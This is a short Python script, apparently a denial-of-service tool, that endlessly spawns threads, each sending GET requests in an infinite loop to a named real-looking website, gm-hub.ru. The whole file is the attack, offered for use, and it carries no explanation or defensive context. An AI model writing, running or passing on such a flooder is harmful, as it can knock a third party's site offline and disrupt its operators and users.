# coding: utf8
import threading
import requests
def dos():
 while True:
  requests.get("https://gm-hub.ru")
  
while True:
 threading.Thread(target=dos).start()